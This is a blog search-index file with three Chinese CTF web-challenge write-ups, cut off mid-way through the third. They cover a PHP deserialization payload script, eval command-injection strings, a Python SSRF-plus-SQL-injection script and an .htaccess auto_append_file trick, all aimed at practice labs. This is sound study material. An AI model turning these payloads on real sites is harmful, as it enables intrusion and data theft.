<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>i春秋CTF之Hash</title>
      <link href="posts/801e5393.html"/>
      <url>posts/801e5393.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x001-wp"><a href="#0x001-wp" class="headerlink" title="0x001 wp"></a>0x001 wp</h2><hr><p>打开题目，点击进入链接</p><p><img src="https://img-blog.csdnimg.cn/img_convert/cbc7c70234b90e31f7f99cd07a57496c.png#pic_center" alt></p><p>有一个提示，要求改变<code>key</code>的值和哈希值，查看源代码</p><p><img src="https://img-blog.csdnimg.cn/img_convert/1029499f9ff23a840c0c25ee8ab0ebaf.png#pic_center" alt></p><p>提示<code>$hash=md5($sign.$key);the length of $sign is 8</code></p><p>解密<code>key=123</code>对应的哈希值：kkkkkk01123</p><p>所以<code>sign=‘kkkkkk01’</code></p><p>然后就好说了，改变<code>key=321</code>，<code>md5</code>加密<code>'kkkkkk01321'</code> 传入</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c4273e8256a0464e1334964b187ed834.png#pic_center" alt></p><p>提示下一步，访问<code>Gu3ss_m3_h2h2.php</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/2613920feaf50f4883593bd7762e1f24.png#pic_center" alt></p><p>好家伙。代码审计一波</p><p><code>demo</code>类里有一些魔法函数，联想到反序列化漏洞</p><p><code>get</code>传入参数<code>var</code>，先<code>base_64</code>解码，然后<code>preg_match</code>正则过滤，</p><p><code>/[oc]:\d+:/i</code> \d 是匹配一个数字，+是一个或者多个</p><p>最后反序列化<code>var</code>，还提示 <code>the secret is in the f15g_1s_here.php</code></p><p><strong>反序列化漏洞详解参考：<br><a href="https://www.freebuf.com/articles/web/263584.html">反序列化漏洞</a></strong></p><p>所以我们需要传入<code>var</code>来访问<code>f15g_1s_here.php</code>这个东西：</p><p>1.修改file属性为<code>f15g_1s_here.php</code>，序列化对象</p><p>2.<code>base_64</code>编码</p><hr><p>但是有一个问题，反序列化是会先检查有没有<code>__wakeup()</code>函数，如果有会先执行<code>wakeup</code>函数，<code>__wakeup()</code>函数会改变<code>file</code>的值，所以必须绕过<code>__wakeup()</code>函数</p><p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html">魔法函数wakeup绕过</a></p><p>改变步骤：</p><p>1.修改<code>file</code>属性为<code>f15g_1s_here.php</code>，序列化对象</p><p>2.改变序列化字符串的属性数目大于实际（绕过<code>__wakeup</code>）</p><p>2.<code>base_64</code>编码</p><hr><p>再接着想，反序列化之前还有一次过滤呀~~还得绕过</p><p>正则匹配到<code>‘O:4’</code>就会报错，怎么绕过呢~ 把4变成+4就可以</p><p>改变步骤：</p><p>1.修改<code>file</code>属性为<code>f15g_1s_here.php</code>，序列化对象</p><p>2.改变序列化字符串的属性数目大于实际（绕过<code>__wakeup</code>）</p><p>3.替换<code>‘O:4’</code>为<code>‘O:+4’</code></p><p>2.<code>base_64</code>编码</p><hr><p>步骤有了，脚本实现一下~</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Demo</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'f15g_1s_here.php'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'O:4'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'O:+4'</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">':1:'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">':2:'</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把跑出来的<code>var</code>传参得到<code>f15g_1s_here.php</code>的源码</p><p><img src="https://img-blog.csdnimg.cn/img_convert/03d8042dbc2e1828f9ba58ac3ba4f06a.png#pic_center" alt></p><hr><p>再看代码。。</p><p>需要<code>get</code>传参<code>val</code>；后面又有一个<code>eval</code>函数，<code>addslashes</code>对<code>val</code>进行了转义</p><p>又是考绕过，如果没有转义函数的话，可以构造</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">val <span class="token operator">=</span> <span class="token variable">$</span><span class="token punctuation">{</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token keyword">echo</span> `ls`<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token shell-comment comment">#ls反引号括住</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是<code>addslashes</code>转义了，可以考虑把<code>echo</code>命令变成变量绕过</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">val<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">{</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">&amp;</span>a<span class="token operator">=</span><span class="token keyword">echo</span> `ls`<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>传参后得到目录文件<code>True_F1ag_i3_Here_233.php</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/37174ce255ae2b047104d420e7cd25f5.png#pic_center" alt></p><p>修改命令<code>cat True_F1ag_i3_Here_233.php</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/5766cdb9ab5d11cc76976158aec109cb.png#pic_center" alt></p><p>什么都没有。。查看源码</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b8860bf817696a5681f6be552d85d690.png#pic_center" alt></p><p>拿到<code>flag:flag{64402796-e35d-4fef-8432-ebdfb459a157}</code></p><hr><blockquote><p><strong>知识点：</strong></p><p><strong>1.hash</strong></p><p><strong>2.反序列化</strong></p><p><strong>3.命令执行</strong></p></blockquote><h2 id="0x002-结束语"><a href="#0x002-结束语" class="headerlink" title="0x002 结束语"></a>0x002 结束语</h2><hr><blockquote><p><strong><em>熬过无人问津的日子，才有诗和远方</em></strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
          <category> CTF笔记篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web高手进阶之ics-02</title>
      <link href="posts/83a42f54.html"/>
      <url>posts/83a42f54.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x001-wp"><a href="#0x001-wp" class="headerlink" title="0x001 wp"></a>0x001 wp</h2><hr><p>进入文档中心页面，点击paper可以下载pdf文件，请求download.php，参数为dl</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e9afdd028be737ec0ecebea34908124a.png#pic_center" alt=""></p><p><img src="https://img-blog.csdnimg.cn/img_convert/5e24a1c524834b2488363c7310c1787d.png#pic_center" alt=""></p><p><code>pdf</code>文件内容为<code>ssrf</code>，可能为线索</p><p>接着扫一遍目录，发现了<code>/secret</code>目录</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d78799738ec286aac5fa3654e5dd79b4.png#pic_center" alt=""></p><p>访问一下试试</p><p><img src="https://img-blog.csdnimg.cn/img_convert/1cba1775d955d707a3aa1e350b7e58af.png#pic_center" alt=""></p><p>分别访问</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5b85600d0460721f556366b282e93070.png#pic_center" alt=""></p><p>看到私密页面1，查看元素，填完表提交，到达私密页面2，元素有一个变量s，s=3时返回页面2</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2fb8340990561fb75ea08d6bcb67a335.png#pic_center" alt=""></p><p>发现<code>secret_debug.php</code>无法访问</p><p>到这里就无头绪了，wp大法，利用<code>download.php</code>传参进行<code>ssrf</code>攻击</p><p>虽然只能下载<code>pdf</code>文件，但是下载一个不存在的文件的时候<code>readfile</code>函数还是会执行的。</p><p>根据<code>secret</code>参数带入<code>secret_debug</code>构造请求</p><p><code>http://111.200.241.244:64242/secret/secret_debug.php？s=3&amp;txtfirst_name=a&amp;txtmiddle_name=b&amp;txtlast_name=c&amp;txtname_suffix=d&amp;txtdob=01/05/2000&amp;txtdl_nmbr=1234&amp;txtretypedl=1234</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/09587a8395c0263a1bae9cceaa078662.png#pic_center" alt=""></p><p>发现<code>.pdf</code>加在了<code>s=3</code>后面，&amp;符号导致，所以进行<code>url</code>编码，服务器再解码，<code>.pdf</code>就会加到所有参数最后</p><p><img src="https://img-blog.csdnimg.cn/img_convert/14b0246f279c125f3a41fd77384ae94b.png#pic_center" alt=""></p><p>还是有问题，<code>.pdf</code>加在最后一个参数后面会影响其值，所以在参数后面再加一个&amp;，相当于隔断了<code>pdf</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/057f4dc3fc2700e2819ca4679365972b.png#pic_center" alt=""></p><p>注册成功。。注册的参数可以进行<code>sql注入</code>，大神的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> urlliburl <span class="token operator">=</span> <span class="token string">' http://111.200.241.244:64242//download.php'</span> <span class="token comment"># subquery = "database()"</span> <span class="token comment"># ssrfw</span> <span class="token comment"># subquery = "select group_concat(table_name) from information_schema.   tables where table_schema='ssrfw'"</span> <span class="token comment"># etcYssrf,users</span> <span class="token comment"># subquery = "select group_concat(column_name) from information_schema.columns where table_name='cetcYssrf'"</span> <span class="token comment"># secretName,value</span> <span class="token comment"># subquery = "select secretName from cetcYssrf LIMIT 1"</span><span class="token comment"># secretname -&gt; flag</span>subquery <span class="token operator">=</span> <span class="token string">"select value from cetcYssrf LIMIT 1"</span> <span class="token comment"># value -&gt; flag{cpg9ssnu_OOOOe333eetc_2018}</span><span class="token builtin">id</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000000</span><span class="token punctuation">)</span>dl <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'http://127.0.0.1/secret/secret_debug.php?'</span> <span class="token operator">+</span>        urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token string">"s"</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span>            <span class="token string">"txtfirst_name"</span><span class="token punctuation">:</span> <span class="token string">"A','b',("</span><span class="token operator">+</span>subquery<span class="token operator">+</span><span class="token string">"),'c'/*"</span><span class="token punctuation">,</span>            <span class="token string">"txtmiddle_name"</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span>            <span class="token string">"txtLast_name"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">,</span>            <span class="token string">"txtname_suffix"</span><span class="token punctuation">:</span> <span class="token string">"D."</span><span class="token punctuation">,</span>            <span class="token string">"txtdob"</span><span class="token punctuation">:</span> <span class="token string">"*/,'01/10/2019"</span><span class="token punctuation">,</span>            <span class="token string">"txtdl_nmbr"</span><span class="token punctuation">:</span> <span class="token builtin">id</span><span class="token punctuation">,</span>            <span class="token string">"txtRetypeDL"</span><span class="token punctuation">:</span> <span class="token builtin">id</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;"</span><span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"dl"</span><span class="token punctuation">:</span> dl<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><blockquote><p><strong>知识点：</strong></p><p><strong>1.ssrf</strong></p><p><strong>2.sql注入</strong></p></blockquote><h2 id="0x001-结束语"><a href="#0x001-结束语" class="headerlink" title="0x001 结束语"></a>0x001 结束语</h2><hr><blockquote><p><strong><em>莫忘少年凌云志 曾许天下第一流</em></strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
          <category> CTF笔记篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web高手进阶之blgdel</title>
      <link href="posts/801ceb23.html"/>
      <url>posts/801ceb23.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x001-wp"><a href="#0x001-wp" class="headerlink" title="0x001 wp"></a>0x001 wp</h2><hr><ul><li>打开页面</li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/43d38460fac65bb460bd1a1b69af53ff.png#pic_center" alt=""></p><hr><ul><li>查看页面后，常规操作~扫一下目录</li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/857458ff1c0ea196e2fc3146e5c1cca1.png#pic_center" alt=""></p><hr><ul><li>发现几个目录可能有线索<br><code>robots.txt</code></li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/27147afa2b39a7f2bb8b125ebf5390b4.png#pic_center" alt=""></p><p><code>config.txt</code> 代码审计</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">master</span><span class="token punctuation">{</span><span class="token keyword">private</span> <span class="token variable">$path</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">stream_open</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/(.*)\/(.*)$/s'</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">path</span><span class="token operator">=</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">===</span><span class="token single-quoted-string string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">path</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">===</span><span class="token single-quoted-string string">'search'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">path</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^uploads\/[a-z]{10}\/$/is'</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'!'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'%03'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'!'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'"'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'!'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"'"</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'!'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'!'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/file:|http|pre|etc/is'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'illegalbbbbbb!'</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'user.jpg'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'upload success!'</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'illegal!'</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$files</span><span class="token operator">=</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;/br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$v</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;/br&gt;'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">stream_eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">stream_read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">stream_stat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">stream_wrapper_unregister</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">stream_wrapper_unregister</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">stream_wrapper_unregister</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'zip'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">stream_wrapper_register</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'master'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'master'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有<code>sql.txt</code>  数据库的一些信息</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ecfb6866404adeea930b7aae67647191.png#pic_center" alt=""></p><hr><ul><li>注册登录后，访问<code>user.php</code></li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/80c6c0923bb71842cfe1a7c4bb5a001a.png#pic_center" alt=""></p><p>看到有文件上传，试着上传一句马，积分达到100分才可上传文件，通过刷推荐人达到，上传后，访问<code>uploads</code>路径下上传的文件</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7de7b6ea4723a05510a037738e55b48e.png#pic_center" alt=""></p><p><img src="https://img-blog.csdnimg.cn/img_convert/a75b77b5a219fc1482e278bf57718bbc.png#pic_center" alt=""></p><p>发现代码被过滤，查看<code>config.txt</code>,上传的文件内容过滤了&lt;等符号<br>看了<code>dalao</code>的<code>wp</code>，说是这里可以上传<code>.htaccess</code>文件，用<code>.htaccess</code>修改配置文件</p><p><strong><code>.htaccess</code>相关介绍，在这里<br><a href="https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html">https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html</a><br><a href="https://blog.csdn.net/cmzhuang/article/details/53537591">https://blog.csdn.net/cmzhuang/article/details/53537591</a></strong></p><hr><ul><li>第一步，通过构造<code>master</code>伪协议来搜索<code>flag</code></li></ul><pre class="line-numbers language-none"><code class="language-none">php_value auto_append_file master://search/path=%2fhome%2f&amp;name=flag<span aria-hidden="true" 